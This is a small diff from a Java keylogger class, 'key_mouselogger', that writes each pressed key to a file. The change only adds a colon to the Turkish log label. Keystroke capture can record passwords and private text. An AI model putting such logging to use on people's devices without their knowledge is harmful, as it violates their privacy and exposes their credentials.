@@ -73,9 +73,9 @@ class key_mouselogger extends Main implements NativeKeyListener {
                 StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
 
             if (keyText.length() > 1) {
-                writer.println("Basılan tuş"+"[" + keyText + "]\n");
+                writer.println("Basılan tuş:"+"[" + keyText + "]\n");
             } else {
-                writer.println("Basılan tuş"+keyText+"\n");
+                writer.println("Basılan tuş:"+keyText+"\n");
             }
 
         } catch (IOException ex) {
